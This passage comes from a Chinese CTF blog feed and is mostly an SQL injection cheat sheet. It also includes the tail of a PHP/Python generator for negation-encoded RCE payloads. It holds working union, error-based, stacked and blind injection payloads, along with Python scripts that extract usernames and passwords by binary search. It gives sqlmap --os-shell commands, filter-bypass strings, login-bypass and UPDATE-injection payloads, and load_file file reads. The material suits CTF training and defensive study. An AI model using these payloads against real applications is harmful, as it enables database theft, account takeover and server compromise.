class="variable">$b</span>=<span class="string">&#x27;end&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;getallheaders&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span>=<span class="string">&#x27;[~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;][!%FF]()));&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下列 payload 取自 <a href="https://blog.csdn.net/m0_73512445/article/details/134542950">https://blog.csdn.net/m0_73512445/article/details/134542950</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="comment"># /usr/bin/python3</span></span><br><span class="line"><span class="comment"># @Author:Firebasky</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">urlbm</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fun = <span class="built_in">input</span>(<span class="string">&quot;Firebasky&gt;: &quot;</span>).strip(<span class="string">&quot;)&quot;</span>).split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> fun[:-<span class="number">1</span>]:</span><br><span class="line">        exp += urlbm(each)</span><br><span class="line">        <span class="built_in">print</span>(exp)</span><br><span class="line">    exp += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(fun) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入汇总</title>
      <link href="/posts/27c8c18f.html"/>
      <url>/posts/27c8c18f.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-结构">SQL 结构</h1><p>整个结构分为数据库(database)，表(table)，列(column)和数据。<br>具体关系如图</p><ul><li>数据库(database) <code>information_schema.schemata</code> <code>table_schema</code></li><li><ul><li>表(table) <code>information_schema.schemata.tables</code> <code>table_name</code></li></ul></li><li><ul><li><ul><li>列(column) <code>information_schema.columns</code> <code>column_name</code></li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li></ul><h1 id="SQL-查询用法">SQL 查询用法</h1><pre><code>查询语句通常为 select a from b where c查库名 select schema_name from information_schema.schemata查表名 select group_concat(table_name) from information_schema.tables where table_schema=database()查列名 select group_concat(column_name) from information_schema.columns where table_name='ctf'查数据 select group_concat(secret,user) from ctf</code></pre><h1 id="SQLMAP-用法">SQLMAP 用法</h1><p>下载：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Injection.html">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Injection.html</a><br>曾经直接注时被 Cookies 卡了半天。我更推荐把 http 文件保存下来用 sqlmap。</p><pre><code>--batch 自动处理请求直接 GET 注： python sqlmap.py -u &quot;url?id=1&quot; --batch- 使用-r 参数用 burp 保存为 1.txt 放到同目录。python sqlmap.py -r 1.txt -p username --batch- 库名 python sqlmap.py -r 1.txt -p username --batch --dbs    - 当前库名 python sqlmap.py -r 1.txt -p username --batch --current-db- 表名 python sqlmap.py -r 1.txt -p username --batch -D mysql --tables- 列名数据一起 python sqlmap.py -r 1.txt -p username --batch -D mysql -T ctf --columns --dump- 选择注入方法 –-technique- 默认为所有    - 注入类型对应的参数    B：基于布尔的盲注    E：基于错误    U：基于联合查询    S：堆叠查询    T：基于时间的盲注    Q：内联查询    python sqlmap.py -r 1.txt -p username –-technique BE --batch- SQLMAP 写 shellpython sqlmap.py -r 1.txt -p username --batch --os-shell找不到 flag 时可以试试- 自定义注入 payload    - 选项：--prefix 和 --suffixpython sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php/?id=1&quot; -p id --prefix &quot;')&quot; --suffix &quot;AND ('abc'='abc&quot;python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php/?id=1&quot; -p id --prefix &quot;\&quot;)&quot; --suffix &quot;AND ('abc'='abc&quot;注入字符有双引号必加\注释- 显示具体payload -v 3 或 -vv （等级默认为1，顺序为0~6，不加等级为2）</code></pre><h1 id="联合查询">联合查询</h1><ul><li>适合有回显的情况</li></ul><h2 id="判断注入类型">判断注入类型</h2><h3 id="数字类（如-id）">数字类（如 id）</h3><pre><code>$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</code></pre><p>直接在数字后注入，不需要空格</p><h3 id="字符类">字符类</h3><pre><code>SELECT * FROM users WHERE username='$username' AND password='$password';</code></pre><p>需要引号闭合。看题目，如果没给源码一般是单个’或&quot;闭合，如果给了源码要判断所有的闭合，记得括号也要闭合完全</p><h2 id="手动注">手动注</h2><p>sql 结尾要使用注释符号，常见的有：</p><pre><code>--+（这里的+是 url 编码过的空格）,--%20（get 传参网站自动省略最后的空格）,#,%23（经过 url 编码）。</code></pre><p>还可以构造如 or ‘1’=‘1 来闭合后面的引号，类似的还有末尾加’,where/**/'1，（做多了题感觉注释真的很看脸，注释不成功就注不下去了）</p><pre><code>1' or true# (万能密码)(在这里解决闭合和注释)1' order by 3# 一直累加数字直到报错（或界面与之前不同）：1' order by 4#  Unknown column '4' in 'order clause</code></pre><p>这时说明一共 3 位，要联合查询 3 位。</p><pre><code>a'union select 1,2,3#</code></pre><p>回显的数字说明哪里是回显位。例子中回显的是 2</p><pre><code>a'union select 1,database(),3#</code></pre><p>库名 mysql</p><pre><code>a'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</code></pre><p>表名 ctf<br>有种类似写法是把 select 写到里面：</p><pre><code>a'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#。</code></pre><p>个人不推荐，很影响美观</p><pre><code>a'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctf'#列名 secreta'union select 1,group_concat(secret),3 from ctf#</code></pre><p>得到 flag，这里 from 后面可以不需要引号<br>如果限制字符长度可能读不全，需要使用函数截取长度</p><pre><code>常见的如 substring,substr,mid,right,left（读不出来记得换，小心过滤）a'union select 1,substring(group_concat(secret),0,30),3 from ctf#a'union select 1,substring(group_concat(secret),25,30),3 from ctf#</code></pre><p>记得合并时去除重叠字符<br>一次读多个数据这样写</p><pre><code>a'union select 1,group_concat(id,'~',username,'~',password),3 from user#</code></pre><h1 id="报错注入">报错注入</h1><ul><li><p>extractvalue</p><pre><code>1'||extractvalue(1,concat('~',database()))#1'||extractvalue(1,concat('~',(select(group_concat(schema_name))from(information_schema.schemata))))#1'||extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('security'))))#1'||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('users'))))#1'||extractvalue(1,concat('~',(select(data)from(output))))#1'||extractvalue(1,concat('~',(select(mid(data,25,30))from(output))))#</code></pre></li><li><p>updatexml</p><pre><code>1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('data1')),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(data1)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(user)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(substring(group_concat(link),25,30))from(user)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(right(group_concat(link),25))from(user)),0x7e),1))#//substring,substr,mid,right,left,reverse</code></pre></li></ul><h1 id="堆叠注入">堆叠注入</h1><p>在 SQL 终端 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，语句会一起执行。</p><pre><code>1';show databases;#得表名supersqli1';use supersqli;show tables;#1';desc words;#1';use supersqli;show columns from `words`;#1';use supersqli;show columns from `1919810931114514`;#1';select * from words;#如果过滤了select:①1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#1'or 1=1#②1';use supersqli;SET @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE sql1 from @sql;EXECUTE sql1;#③1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#1';create table less38 like users;#1';drop table less38;#insert插入数据库1';insert into ctf values(&quot;111&quot;,&quot;aaa&quot;,&quot;bbb&quot;);--%20*,11;set sql_mode=pipes_as_concat;select 1</code></pre><h1 id="布尔，时间盲注">布尔，时间盲注</h1><p>利用脚本 二分查找所有可见字符<br>bool <a href="http://xn--8nru34h.py">参考.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bool</span></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;or ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(username,&#x27;~&#x27;,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:21028/Less-15/&quot;</span></span><br><span class="line">        payload = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag.jpg&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(low)</span></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>time <a href="http://xn--8nru34h.py">参考.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># time</span></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;or if(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(username,&#x27;~&#x27;,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:21028/Less-15/&quot;</span></span><br><span class="line">        payload = payload1.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= <span class="number">0.8</span>:  <span class="comment"># 判断是否延时</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>waf 不强可以用 SQLMAP 省时间</li></ul><h1 id="过滤绕过">过滤绕过</h1><h2 id="大小写，双写">大小写，双写</h2><p>字面意思，有些过滤不严的只过滤全小写，sql 对大小写不敏感，构造 Select 就能绕过，双写如过滤 or 在中间再写一遍，oorr 就绕过了<br>判断通过报错中没有对应关键字逐一尝试就行（应该不会有出题人不给源码和报错又加双写吧）</p><h2 id="16-进制转换">16 进制转换</h2><p>可以把引号内的字符串转为 0x 开头的 16 进制数来绕过<br>‘flag’-&gt;0x666c6167</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;0x&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常用替换">常用替换</h2><pre><code>空格-&gt;/\*\*/,括号绕过,%a0,%09and-&gt;&amp;&amp;or-&gt;||=-&gt;like,regexpdatabase()-&gt;schema()table_schema-&gt;database_name</code></pre><h2 id="注释符">注释符</h2><pre><code>--空格--+#%23^1末尾加'or '1'='1and '1'='1where/**/'1</code></pre><h2 id="大于小于号绕过">大于小于号绕过</h2><p>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。<br>绕过可以使用下列函数:</p><pre><code>greatest(n1, n2, n3…):返回 n 中的最大值least(n1,n2,n3…):返回 n 中的最小值select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;strcmp(str1,str2):  若所有的字符串均相同，则返回 STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1  select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);in + 关键字  select * from cms_users where userid=1 and substr(database(),1,1) in ('c');between a and b:范围在 a-b 之间（不包含 b）  select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';</code></pre><h2 id="concat-被过滤">concat 被过滤</h2><ul><li>在 select 语句结尾加 limit 1（只会读取一个数据，即第一个）<br>可以逐一读取直到读到想要的值<br>limit 0,1-&gt;第一个,limit 1,1-&gt;第二个,limit 2,1-&gt;第三个…<br><a href="https://blog.csdn.net/nicai321/article/details/123119356">https://blog.csdn.net/nicai321/article/details/123119356</a></li></ul><h2 id="information-schema-被过滤">information_schema 被过滤</h2><p>更换下面这些库以爆出表名:</p><pre><code>sys.schema_auto_increment_columnssys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.x$schema_table_statisticssys.x$ps_schema_table_statistics_iomysql.innodb_table_statsmysql.innodb_index_stats</code></pre><p>之后会面临两个情况：</p><ol><li>只有一个表，直接使用 select * from table_name 爆出 columns。</li><li>不止一个表，这时使用无列名注入</li></ol><h3 id="无列名注入">无列名注入</h3><p>适用 information_schema 被过滤。<br>原理为将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询</p><pre><code>1'union/**/select/**/1,2,`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/'11'union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/'1</code></pre><p>当`反引号也被过滤时，使用 as 别名替换绕过</p><pre><code>1'union/**/select/**/1,2,group_concat(a)/**/from/**/(select/**/1/**/as/**/a/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/'1</code></pre><p>时间盲注 (flag 里有空格会出错)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:4000/?id=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~#&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">2</span>  <span class="comment"># 设置延时阈值，秒数</span></span><br><span class="line"><span class="comment"># 1&#x27;%26%26(true)%26%26/**/&#x27;1&#x27;=&#x27;1</span></span><br><span class="line">payload0 = <span class="string">&quot;1&#x27;&amp;&amp;if(substr((select version()),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,sha1(1)),0)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>  <span class="comment"># 5.7.31</span></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;&amp;&amp;if(substr((select group_concat(database())),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,sha1(1)),0)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>  <span class="comment"># web2</span></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;&amp;&amp;if(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,sha1(1)),0)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>  <span class="comment"># atable,users,flag</span></span><br><span class="line"><span class="comment"># sys.schema_auto_increment_columns</span></span><br><span class="line"><span class="comment"># sys.schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics</span></span><br><span class="line"><span class="comment"># sys.x$ps_schema_table_statistics_io</span></span><br><span class="line"><span class="comment"># mysql.innodb_table_stats</span></span><br><span class="line"><span class="comment"># mysql.innodb_index_stats</span></span><br><span class="line">payload3 = <span class="string">&quot;1&#x27;&amp;&amp;if(substr((select * from flag),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,sha1(1)),0)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>  <span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 从1开始</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload = payload3.<span class="built_in">format</span>(i, j).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\x09&quot;</span>)</span><br><span class="line">        full_url = url + quote(payload)</span><br><span class="line">        <span class="built_in">print</span>(full_url)</span><br><span class="line">        <span class="comment"># 记录请求开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=full_url)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否触发防御</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nono&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">&quot;请求被阻止请求被阻止请求被阻止请求被阻止请求被阻止请求被阻止请求被阻止&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;最终 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算响应时间</span></span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在测试字符: <span class="subst">&#123;j&#125;</span>, 响应时间: <span class="subst">&#123;response_time:<span class="number">.2</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否达到延时阈值</span></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= timeout_threshold:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到字符: <span class="subst">&#123;j&#125;</span>, 当前 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有更多字符，退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>数字型 sql 盲注的另一种做法：</p><pre><code>1^1^1 返回正常数据1^0^1 返回值不一样使用库名更换爆出表名1^(select(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;))^1爆出flag在f1ag_1s_h3r3_hhhhh中测试字段数1^(select((select 1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1 返回正常数据1^(select((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1 返回值不一样无列名注入拿到flag1^(select((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1</code></pre><h2 id="过滤了小括号">过滤了小括号()</h2><p>运气做出来过一题，记录一下<br>concat()转为 limit,然而 limit 也被屏蔽后。。</p><pre><code>eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Schemata+Where+Schema_name+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+'ctf'+and+Table_name+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Columns+Where+Table_Schema+like+'ctf'+and+Table_name+like+'f1444444g'+and+Column_name+like+binary+'A%'%23eid002'+Union+Select+1,2,fl4g,4,5+From+f1444444g%23</code></pre><p>靠执行成功时数字溢出进行布尔盲注。</p><h1 id="SQL-杂项">SQL 杂项</h1><ul><li><p>ffifdyop md5($password,‘true’)-&gt;ffifdyop</p></li><li><p>可尝试 load_file()直接读入</p><pre><code>1'union select 1,2,3,4,load_file('/flag')</code></pre></li><li><p>SQL 登录题</p><pre><code>username=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></pre></li><li><p>quine 注入<br>过滤了 char，用 chr 或者 0x 代替</p><pre><code>.1'/**/union/**/select/**/replace(replace('1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#',char(34),char(39)),char(46),'1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#')#B1'/**/union/**/select/**/replace(replace('&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#',char(34),char(39)),char(66),'&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#')#%1'/**/union/**/select/**/REPLACE(replace('&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#',0x22,0x27),0x25,'&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#')#</code></pre></li><li><ul><li>char()转为 0x 脚本</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">str_input = <span class="string">&quot;&quot;&quot;1&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;,char(34),char(39)),char(66),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;)#&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_to_hex</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;num:x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">result = re.sub(<span class="string">r&quot;char\((\d+)\)&quot;</span>, char_to_hex, str_input)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>UPDATE 注入<ol><li>注册时将用户名设为如 admin’-- ,admin’#,通过修改密码处的 UPDATE 函数修改原本密码。</li><li>修改商品价格 1’;UPDATE items SET price=1;#</li></ol></li><li>二次注入<br>对用户名联合注入<br>注意冒号前不能设置为能查询到的值，不然没法回显</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux命令执行</title>
      <link href="/posts/5eef1d19.html"/>
      <url>/posts/5eef1d19.html</url>
      
